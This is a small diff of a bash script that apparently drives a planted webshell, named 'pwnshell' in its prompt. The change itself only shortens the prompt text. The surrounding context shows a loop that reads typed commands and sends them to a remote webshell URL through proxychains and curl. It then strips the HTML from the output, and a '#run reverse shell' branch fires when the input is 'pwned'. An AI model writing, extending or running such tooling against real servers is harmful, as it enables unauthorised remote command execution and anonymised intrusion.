@@ -42,7 +42,7 @@ fi
 #interactive console
 tput cnorm;while [ "$cmd" != "exit" ]
 do
-  printf "\e[1;33mF@br1x\e[1;30m@\e[1;31mpwnshell\e[1;37m:~$\e[1;32m " && read -r cmd
+  printf "\e[1;31mpwnshell\e[1;37m:~$\e[1;32m " && read -r cmd
   proxychains -q curl -s -X GET -G $url_webshell --data-urlencode "cmd=$cmd" |awk '/<pre>/, /<\/pre>/'|sed 's/<pre>//'|sed 's/<\/pre>//'
   #run reverse shell
   if [ "$cmd" == "pwned" ]; then
